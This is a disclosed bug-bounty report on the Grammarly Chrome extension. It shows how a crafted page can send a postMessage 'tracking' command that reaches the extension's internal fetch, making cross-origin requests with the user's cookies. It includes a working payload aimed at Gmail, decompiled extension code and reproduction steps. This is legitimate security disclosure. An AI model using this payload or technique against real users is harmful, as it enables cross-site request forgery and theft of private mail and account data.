# Handling of `tracking` command allows making arbitrary blind requests with user's cookies from Grammarly Extension's origin

## Report Details
- **Report ID**: 389108
- **URL**: https://hackerone.com/reports/389108
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-08-01T01:12:27.640Z
- **Disclosed**: 2019-08-01T15:59:18.760Z

## Reporter
- **Username**: metnew
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: grammarly

## Vulnerability Information
## **Summary:**

Attacker could trigger Grammarly extension's `gnar._fetch` command using a crafted page to perform XHR with cookies and any configurational params to any cross-origin resource.

## **Description:** 

### Page could Init Grammarly popup editor [no user gesture, helper]

Events have `isTrusted` property, which allows to determinate, whether current event is trusted(initiated by user). Grammarly popup editor could be initiated by page.

As I understood: injected content script could successfully emit events to background page only if popup was initiated earlier. 
That means, attacker needs to initiate the popup somehow to communicate with background page through injected content script.

Not sure about the root cause of this behavior. Probably, because popup is created by background page origin, that's why background page becomes accessible after this.

## Sending commands to Grammarly content script

Active page could send commands to injected Grammarly content script using `window.postMessage`.

Command structure:
``` js
window.postMessage({
    grammarly: true,
    action: 'tracking',
    method: 'gnar._fetch',
    props: {}
    params: {}
}, "*")
```

## Commands handling in injected content script

Grammarly content script "parses" commands using this snippet:

``` js
function Z(e) {
    var t, n = e.action;
    ... 
    "tracking" === n && e.method && g.call(e.method, e.param, e.props)
    ...
}
```

`tracking` commands are later passed to this snippet:
``` js
f.emitBackground("tracking-call", {
    msg: e, // command's "method" field
    data: t // command's "props" + "params" fields
 }, s)
```

This `f.emitBackground` sends event to background page.

### Commands handling in extension's background page

The extension uses next snippet to handle `tracking` commands from content script:

``` js
function w(e, t) { // t = params + props
    var n, a = o(e.split("."), 2), // a = command's "method" field splitted by dot into array
        c = a[0],
        s = a[1];
    if ("gnar" === c) 
        if (p.tracker.gnar)
            if ("track" === s) {
                var u = o(t, 2),
                    l = u[0], // 
                    f = u[1];
                p.tracker.gnar.track(r({
                    eventName: g.gnarAppName + "/" + l // something not discovered yet 
                }, f))
            } else
                p.tracker.gnar[s] ? (n = p.tracker.gnar)[s].apply(n, i(t)) : b.error(
                    "gnar client does not have method '" + s + "' for '" +
                    e + "' in runMessage");
    else b.error("gnar client not available for '" + e + "' in runMessage");
    else b.error("unrecognized'" + e + "' in runMessage ")
}
```

#### `p.tracker.gnar`

That's an object with next structure:
```js
{
    _batchId: 8,
    _client: "chromeExt",
    _clientVersion: "14.858.1756",
    _containerIdManager: t {primaryStorage: t, secondaryStorages: Array(3), _logger: t, _metric: e,  _cacheSuccessTimeoutMillis: 1000, …},
    _eventsUrl: "https://gnar.grammarly.com/events",
    _fetch: ƒ (),
    _instanceId: "nxIwqgPE",
    _isTest: false,
    _isUserReady: true,
    _liteUrl: "https://gnar.grammarly.com/lite",
    _logger: t {name: "gnar", level: 2, context: e, appender: ƒ},
    _metric: t {name: "gnar", timersSink: ƒ, countersSink: ƒ, _fetch: ƒ, _sendTimeout: 7500, …},
    _queue: [],
    _storePingTimestamp: true,
    _userId: "701014151
}
```

Additionally, it has a set of methods.

> I guess `p.tracker.gnar` controls reporting telemetry events to Grammarly.

#### Attacker-controllable function call

``` js
p.tracker.gnar[s] ? (n = p.tracker.gnar)[s].apply(n, i(t))
```

`s` = that's the second part of command's "method" field. E.g. `"method": "hello.grammarly"` -> s = 'grammarly'
`t` = `params` and `props`

This snippet could be rewritten as:

``` js
GNAR[methodsMethod].apply(GNAR,  toArray(paramsAndProps))
```

#### `p.tracker.gnar`s `.constructor` and methods

`p.tracker.gnar` object could be overwritten using `.constructor`  and `.setUser` methods those allow changing some `p.tracker.gnar` properties. 

`p.tracker.gnar`s `.constructor`
```
function e(e, t, n, r, o, i, c, s) { // Attacker controls e and t params + non-listed params using `setUser`
            void 0 === s && (s = !1),
            this._client = t,
            this._clientVersion = n,
            this._fetch = r,
            this._containerIdManager = o,
            this._logger = i,
            this._metric = c,
            this._storePingTimestamp = s,
            this._instanceId = a.alphanumeric(8),
            this._batchId = 0,
            this._isUserReady = !1,
            this._queue = [],
            this._eventsUrl = e + "/events",
            this._liteUrl = e + "/lite",
            this._pingMaybe()
        }
```

##### `gnar.setUser`/`gnar._execQueue` / `gnar._send` / `gnar._doSend` / `gnar._enqueue` 

`p.tracker.gnar` has a set of interesting methods like `setUser`. Grammarly extension uses `setUser` to invalidate session. 

``` js
a["session-invalidate"] = function (e, t, n, r, o) {
        ...
        s.call("gnar.setUser", i, c)
        ...
}
```

> I'm not sure, but looks like calling this method with crafted payload may lead to incorrect userId in telemetry. 

Team probably should know how much powerful listed above funcstions are. 

#### `_fetch`

`p.tracker.gnar` has `_fetch` property which points to `fetch` function.
More interesting is that, it's a polyfill, not a native function.

> I guess this polyfill isn't compliable to WHATWG fetch, because it allows making requests to `data:/chrome-extension:/` origins.

That means, it's possible to call `fetch()` with attacker's params from the extension.

```
p.tracker.gnar_fetch.apply(p.tracker.gnar, ["FetchURL", "FetchParams"])
```

Page has to call `window.postMessage` with next object to call `fetch` from the extension
```
x = window.top.postMessage({
    grammarly: true,
    action: 'tracking',
    method: 'gnar._fetch',
    props: { // FetchParams
        method: 'GET',
        headers: {
            'Content-Type': 'application/json'
        }
    },
    param: 'https://mail.google.com/mail/u/0/#inbox' // <FetchURL>
}, "*")
```

#### XHR + cookies

Grammarly extension has permissions to access all URLs and cookies from all origins. 
Grammarly makes all XHR requests with cookies -> it's possible for attacker to make blind requests with cookies to any origin.

> (except `chrome://`, however, `chrome-extension://` is allowed because of polyfill for `fetch`).

> More details in "Impact" section.

## Browsers Verified In:

Chrome 70.0.3508.0 Canary
Chrome 68.0.3440.75 Stable
Grammarly: 14.858.1756

## Steps To Reproduce:

### Change user's name in Grammarly
1. Open `app-grammarly-csfr.html`
2. Page makes request to `https://auth.grammarly.com/v3/user` to change your name to "Anonymous User" 

### GET Gmail as proof
1. Open Grammarly extension debug page in Chrome
2. Open `get-request-to-gmail.html`
3. Open "Network" tab in the debug page
4. Note that extension made a GET request to Gmail (with cookies)
5. Open request preview
6. Note that request includes your gmail content
7.  That means, it's possible to initiate requests with cookies to any origin. Web applications without "direct CSRF protection" (e.g. `hidden` field with some value, not token in cookies ) are controllable by attacker.

## Supporting Material/References:

1. Screencast for POST to`https://auth.grammarly.com/v3/user`. [1st PoC]
2. Screencast to prove that Grammarly makes requests with cookies to cross-origin domains. [2nd PoC] 

> I didn't know a good CSRF target, so I've recorded a second screencast with Gmail and GET request. I think that's enough to prove the vulnerability.

## Impact

## Universal CSRF
> Actually, "Universal CSRF" isn't a correct definition 😉. But I think it correctly expresses impact of the vulnerability.

Attacker could trigger Grammarly extension's `gnar._fetch` command  using crafted page to perform XHR with any configurational params to any origin [without user gesture]. 

Web applications without good protection against CSRF (`hidden` field in form, not cookies/origin check/etc.) are vulnerable to CSRF. 

Page could made **any number of blind requests through Grammarly extension with cookies**. 

## Overwrite `p.tracker.gnar` and call any method of this object

`p.tracker.gnar` has a set of interesting methods like `setUser`. Grammarly extension uses `setUser` to invalidate session.

> I assume, calling this methods leads to sending invalid telemetry data to Grammarly.

## Possible UXSS via data manipulation

Attacker could overwrite `p.tracker.gnar` with arbitrary data. However, `postMessage` doesn't allow to send [non-clonable objects](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm).

Attacker could call something like:

```
AnythingClonable.apply(Object, [AnythingClonable])
```

> I didn't test this with `File/Blob/FileList` non-clonnable objects. However, I think it's not possible to turn the snippet above into XSS.
 
> P.S: Grammarly, sorry for typos/mistakes if any. Your extension has some bugs at `hackerone.com` domain.

## Attachments
- grammarly-ucsrf-username.mp4
- grammarly-gmail-get-as-proof.mp4
- app-grammarly-csfr.html
- get-request-to-gmail.html
